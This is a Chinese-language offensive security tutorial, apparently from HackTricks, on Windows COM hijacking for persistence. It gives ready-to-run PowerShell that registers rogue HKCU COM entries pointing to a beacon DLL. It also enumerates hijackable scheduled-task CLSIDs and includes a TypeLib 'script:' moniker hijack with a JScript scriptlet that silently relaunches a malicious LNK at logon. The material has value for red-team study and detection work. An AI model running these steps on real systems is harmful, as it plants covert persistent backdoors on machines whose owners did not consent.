# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 搜索不存在的 COM 组件

由于 HKCU 的值可以被用户修改，**COM Hijacking** 可被用作一种**持久化机制**。使用 `procmon` 很容易找到被搜索但不存在的 COM 注册表项，攻击者可以创建这些项以实现持久化。过滤器：

- **RegOpenKey** 操作。
- 其中 _Result_ 为 **NAME NOT FOUND**。
- 且 _Path_ 以 **InprocServer32** 结尾。

一旦决定了要冒充的不存在的 COM，请执行以下命令。_如果你决定冒充一个每隔几秒就被加载的 COM，请小心，因为这可能过于频繁。_
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### 可劫持的 Task Scheduler COM 组件

Windows Tasks 使用 Custom Triggers 调用 COM objects，并且因为它们通过 Task Scheduler 执行，所以更容易预测它们何时会被触发。

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

检查输出后，你可以选择一个例如会在 **每次用户登录时** 执行的任务。

现在在 **HKEY\CLASSES\ROOT\CLSID** 以及 HKLM 和 HKCU 中搜索 CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**，通常会发现该值在 HKCU 中不存在。
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
然后，你只需创建 HKCU 条目，每次用户登录时，你的 backdoor 就会被触发。

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) 定义 COM 接口，并通过 `LoadTypeLib()` 加载。当 COM server 被实例化时，操作系统可能会通过查阅注册表键 `HKCR\TypeLib\{LIBID}` 来加载关联的 TypeLib。如果将 TypeLib 路径替换为一个 **moniker**，例如 `script:C:\...\evil.sct`，当解析该 TypeLib 时，Windows 会执行该 scriptlet——从而产生一种在常见组件被访问时触发的隐蔽持久化方式。

这已在 Microsoft Web Browser control（常被 Internet Explorer、嵌入了 WebBrowser 的应用，甚至 `explorer.exe` 加载）中被观察到。

### 步骤 (PowerShell)

1) 识别被高频 CLSID 使用的 TypeLib (LIBID)。示例：常被 malware chains 滥用的 CLSID：`{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}`（Microsoft Web Browser）。
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) 将 per-user TypeLib 路径指向使用 `script:` moniker 的本地 scriptlet（不需要管理员权限）：
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) 投放一个最小的 JScript `.sct`，用于重新运行你的主 payload（例如初始链使用的 `.lnk`）：
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – 打开 IE、嵌入 WebBrowser control 的应用程序，或甚至常规的 Explorer 活动都会加载 TypeLib 并执行 scriptlet，从而在 logon/reboot 时重新激活你的 chain。

Cleanup
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
注意事项
- 您可以将相同的逻辑应用到其他高频 COM 组件；始终先从 `HKCR\CLSID\{CLSID}\TypeLib` 解析真实的 `LIBID`。
- 在 64-bit 系统上，您也可以为 64-bit 客户端填充 `win64` 子键。

## 参考资料

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
